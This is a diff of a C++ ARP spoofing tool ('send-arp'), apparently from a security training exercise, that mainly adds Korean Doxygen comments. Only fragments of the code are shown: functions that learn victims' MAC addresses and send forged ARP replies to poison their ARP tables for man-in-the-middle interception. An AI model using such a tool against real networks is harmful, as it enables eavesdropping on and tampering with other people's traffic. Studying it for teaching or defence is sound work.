@@ -1,4 +1,28 @@
-// spoofing 전 victim의 arp table를 resolving 중복 수행을 어떻게 최적화 하여 해결 할것인지?
+/**
+ * @file main.cpp
+ * @brief ARP Spoofing 공격을 수행하는 메인 프로그램
+ * @author 작성자명
+ * @date 2024-01
+ * @version 1.0
+ * 
+ * @details
+ * ARP Spoofing 공격을 통해 네트워크 상의 피해자 호스트의 ARP 테이블을 감염시키는 프로그램입니다.
+ * 피해자가 게이트웨이로 보내는 패킷을 중간에서 가로채기 위해 게이트웨이의 MAC 주소를 
+ * 공격자의 MAC 주소로 속이는 ARP Reply 패킷을 주기적으로 전송합니다.
+ * 
+ * 주요 기능:
+ * - 공격자의 MAC/IP 주소 자동 탐지
+ * - ARP Request를 통한 피해자 MAC 주소 수집
+ * - 주기적인 ARP Spoofing 패킷 전송
+ * - 다중 피해자 동시 공격 지원
+ * 
+ * 사용 방법:
+ * send-arp <interface> <sender ip1> <target ip1> [<sender ip2> <target ip2> ...]
+ * 예) send-arp wlan0 192.168.0.2 192.168.0.1 192.168.0.3 192.168.0.1
+ * 
+ * @warning 본 프로그램은 교육 목적으로만 사용되어야 하며,
+ * 실제 네트워크에서의 악의적인 사용은 법적 처벌 대상이 될 수 있습니다.
+ */
 
 #include "pch.h"     // POSIX 표준 함수 제공
 #include "ethhdr.h"     // Ethernet 헤더 구조체 정의
@@ -6,6 +30,16 @@
 
 #pragma pack(push, 1)  // 메모리 정렬방식 조정(패딩 제어) ,1 은 패딩없이 1바이트씩 정렬 네트워크 패킷 송수신시 패딩없이 직렬화로 송수신하기 위함
 // Ethernet과 ARP 패킷을 합친 구조체 정의
+
+/**
+ * @brief Ethernet과 ARP 패킷을 합친 구조체
+ * @details
+ * Ethernet 헤더와 ARP 헤더를 합쳐서 하나의 구조체로 정의합니다.
+ * 
+ * 주요 필드:
+ * - eth_: Ethernet 헤더
+ * - arp_: ARP 헤더
+ */
 struct EthArpPacket final {
     EthHdr eth_; // Ethernet 헤더
     ArpHdr arp_; // ARP 헤더
@@ -18,6 +52,16 @@ uint8_t* attacker_mac;      // 공격자의 MAC 주소를 저장할 포인터 6b
 char* attacker_ip;          // 공격자의 IP 주소를 저장할 포인터 4byte // 자료구조 예쁘게 
 // 해당 전역변수는 들어오는 반환값에 따라 예쁘게 자료구조 정리 필요 + 전역이 아닌 다른 방식으로 예쁘게 처리해보기.
 
+/**
+ * @brief ARP 페어 구조체
+ * @details
+ * ARP 감염 공격을 위한 피해자와 게이트웨이의 IP/MAC 주소를 저장하는 구조체입니다.
+ * 
+ * 주요 필드:
+ * - sender_ip: 피해자의 IP 주소
+ * - target_ip: 게이트웨이의 IP 주소 (피해자가 접근하고자 하는 목적지)
+ * - sender_mac: 피해자의 MAC 주소
+ */
 struct ArpPair {
     uint32_t sender_ip;     // ARP 감염 대상이 되는 피해자의 IP 주소
     uint32_t target_ip;     // 게이트웨이의 IP 주소 (피해자가 접근하고자 하는 목적지)
@@ -26,7 +70,14 @@ struct ArpPair {
 };
 
 // 공격자의 MAC 주소를 가져오는 함수
-void getAttackerMac(char* dev) { 
+/**
+ * @brief 공격자의 MAC 주소를 가져오는 함수
+ * @param dev 네트워크 인터페이스 이름 (예: "eth0", "wlan0")
+ * @details
+ * 지정된 네트워크 인터페이스의 MAC 주소를 가져와서 전역 변수 attacker_mac에 저장합니다.
+ * ioctl() 시스템 콜을 사용하여 하드웨어 주소를 조회합니다.
+ */
+void getAttackerMac(char* dev) {
     int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
     interface_req.ifr_addr.sa_family = AF_INET;           // IPv4 주소 체계 설정
     strncpy(interface_req.ifr_name, dev, IFNAMSIZ - 1);   // 인터페이스 이름 설정
@@ -35,6 +86,13 @@ void getAttackerMac(char* dev) {
 }
 
 // 공격자의 IP 주소를 가져오는 함수
+/**
+ * @brief 공격자의 IP 주소를 가져오는 함수
+ * @param dev 네트워크 인터페이스 이름 (예: "eth0", "wlan0")
+ * @details
+ * 지정된 네트워크 인터페이스의 IP 주소를 가져와서 전역 변수 attacker_ip에 저장합니다.
+ * ioctl() 시스템 콜을 사용하여 IP 주소를 조회합니다.
+ */
 void getAttackerIP(char* dev) {
     int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
     strncpy(interface_req.ifr_name, dev, IFNAMSIZ - 1);    // 인터페이스 이름 설정
@@ -42,7 +100,15 @@ void getAttackerIP(char* dev) {
     attacker_ip = inet_ntoa(((struct sockaddr_in*)&interface_req.ifr_addr)->sin_addr); // IP 주소 문자열로 변환 -> 4byte -> 전역변수 말고 다른방향으로 만들어보기.
 }
 
-// ARP 요청 패킷을 생성 및 전송하는 함수
+/**
+ * @brief ARP 요청 패킷을 생성 및 전송하는 함수
+ * @param dev 네트워크 인터페이스 이름 (예: "eth0", "wlan0")
+ * @param handle pcap 핸들
+ * @param sender_ip 타겟 IP 주소
+ * @details
+ * ARP 요청 패킷을 생성하고, 지정된 네트워크 인터페이스로 전송합니다.
+ * 전송 결과를 확인하고 오류가 발생하면 에러 메시지를 출력합니다.
+ */
 void sendArpRequest(char* dev, pcap_t* handle, uint32_t sender_ip) {
     EthArpPacket packet;  // Ethernet + ARP 패킷 구조체 생성
     
@@ -68,7 +134,18 @@ void sendArpRequest(char* dev, pcap_t* handle, uint32_t sender_ip) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
 }
-// ARP 감염 패킷 전송 함수
+
+/**
+ * @brief ARP 감염 패킷 전송 함수
+ * @param dev 네트워크 인터페이스 이름 (예: "eth0", "wlan0")
+ * @param handle pcap 핸들
+ * @param victim_ip 피해자의 IP 주소
+ * @param victim_mac 피해자의 MAC 주소 
+ * @param gateway_ip 게이트웨이의 IP 주소
+ * @details
+ * ARP 감염 패킷을 생성하고, 지정된 네트워크 인터페이스로 전송합니다.
+ * 전송 결과를 확인하고 오류가 발생하면 에러 메시지를 출력합니다.
+ */
 void sendArpInfectingReply(char* dev, pcap_t* handle, uint32_t victim_ip, 
                           const uint8_t* victim_mac, uint32_t gateway_ip) { //dev 인자 필요없다. 체크해야함
     EthArpPacket packet; // Ethernet + ARP 패킷 구조체 생성
@@ -93,6 +170,14 @@ void sendArpInfectingReply(char* dev, pcap_t* handle, uint32_t victim_ip,
     }
 }
 
+/**
+ * @brief 메인 함수
+ * @param argc 명령행 인자 개수
+ * @param argv 명령행 인자 배열
+ * @details
+ * 프로그램의 진입점입니다. 네트워크 인터페이스 이름과 피해자 호스트의 IP 주소를 입력받아
+ * ARP 요청을 통해 피해자의 MAC 주소를 수집하고, 주기적으로 ARP 감염 패킷을 전송합니다.
+ */
 int main(int argc, char* argv[]) {
     // 인자 수 확인: 최소 4개 이상, 짝수 개의 IP 쌍 필요
     // 인자 개수가 4개 미만이거나 (인터페이스 + sender IP + target IP 최소 필요)
